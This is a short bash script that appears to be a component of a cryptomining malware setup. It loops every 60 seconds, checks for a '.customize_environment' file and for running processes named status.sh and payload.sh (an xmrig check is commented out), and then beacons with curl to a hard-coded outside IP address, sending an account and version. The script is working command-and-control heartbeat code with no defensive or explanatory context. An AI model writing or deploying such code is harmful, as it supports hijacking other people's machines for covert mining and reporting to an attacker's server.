#!/bin/bash

while true
do
   if [ -e '.customize_environment' ] && 
#      pgrep xmrig > /dev/null && 
      pgrep status.sh > /dev/null && 
      pgrep payload.sh > /dev/null
   then
       url='http://51.81.101.99/ping.php?account='$1'&version='$2
       curl $url
   fi
   
   sleep 60
done
